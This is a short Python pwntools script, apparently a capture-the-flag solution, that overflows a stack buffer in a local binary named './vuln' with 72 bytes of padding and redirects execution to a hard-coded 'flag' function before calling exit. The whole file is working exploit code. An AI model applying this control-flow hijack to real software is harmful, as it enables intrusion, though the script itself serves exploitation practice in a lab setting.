from pwn import *

p = process('./vuln')

padding = b'a'*72
flag_fun = p64(0x00400768)
exit_fun = p64(0x00400670)

payload = padding + flag_fun + exit_fun

p.sendline(payload)
print(p.recvall())
